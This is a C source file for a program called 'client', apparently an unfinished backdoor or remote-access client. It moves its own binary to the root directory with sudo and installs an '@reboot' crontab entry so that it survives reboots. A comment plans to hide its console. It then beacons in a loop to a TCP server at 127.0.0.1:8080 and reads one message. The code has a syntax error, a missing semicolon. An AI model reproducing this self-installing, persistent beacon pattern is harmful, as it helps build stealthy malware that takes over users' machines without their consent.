#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

#define PORT    8080
#define BUFSIZE     1024

int main(int argc, char const* argv[]) {

    char *pwd_cmd = "pwd";
    char cwd[BUFSIZE];
    FILE *ptr;

    if ((ptr = popen(pwd_cmd, "r")) != NULL)
        while (fgets(cwd, BUFSIZE, ptr) != NULL);
        pclose(ptr);
    if (strcmp(cwd, "/\0") != 0) {
        char *move_cmd = "sudo mv client /\0"
        if (system(move_cmd) != -1) {
            printf("client has been moved\n");
        }
        //TODO check if already added to crontab
        char *startup_cmd = "crontab -l > file; echo \"@reboot /client\" >> file; crontab file; rm file;";
        if (system(startup_cmd) != -1) {
            printf("startup settings changed\n");
        }
    }

    //TODO settings that will hide console

    struct sockaddr_in address; 
    bzero(&address, sizeof(address));

    printf("created serv_adress\n");

    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &(address.sin_addr.s_addr));

    printf("filled address\n");

    int sock = socket(AF_INET, SOCK_STREAM, 0);

    printf("created socket\n");

    bind(sock, (struct sockaddr *)&address, sizeof(address));

    printf("binded socket to port\n");

    while (1) {
        if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == 0) {
            printf("connected\n");
            break;
        } else {
            char serv_address[BUFSIZE];
            bzero(serv_address, sizeof(serv_address));
            inet_ntop(AF_INET, &(address.sin_addr.s_addr), serv_address, sizeof(serv_address));
            printf("trying to connect to at %s:%d\n", serv_address, ntohs(address.sin_port));
            sleep(1);
        }
    }

    char fname_recv_buffer[BUFSIZE];

    while (1) {
        bzero(fname_recv_buffer, sizeof(fname_recv_buffer));
        if (read(sock, fname_recv_buffer, sizeof(fname_recv_buffer))) {
            printf("Recieved from server: %s\n", fname_recv_buffer);
            break;
        } else {
            printf("recieved nothing...\n\n");
        }
    }

    printf("client closing connection\n");
    close(sock);
    printf("connection closed - client\n");

    return 0;
}